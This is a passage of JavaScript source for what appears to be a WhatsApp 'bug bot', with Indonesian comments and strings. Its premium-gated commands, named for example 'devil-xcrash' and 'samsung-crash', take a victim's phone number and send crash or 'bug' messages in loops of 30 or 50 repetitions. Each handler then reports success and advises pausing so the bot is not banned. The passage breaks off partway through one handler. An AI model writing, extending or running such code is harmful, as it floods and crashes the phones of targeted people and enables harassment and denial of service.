case 'pokemon': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'elania-strong': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'devil-xcrash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
// GAUSAH DI RECODE YAAAA APALGI LU RENAME 😂😂😂😂
case 'devil-strong': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break

case 'devil-unexpected': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'notif-ui': case 'notif-crash': case 'crash-total': case '🔥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'chace-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'enter-samsung': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-internal': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-reboot': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
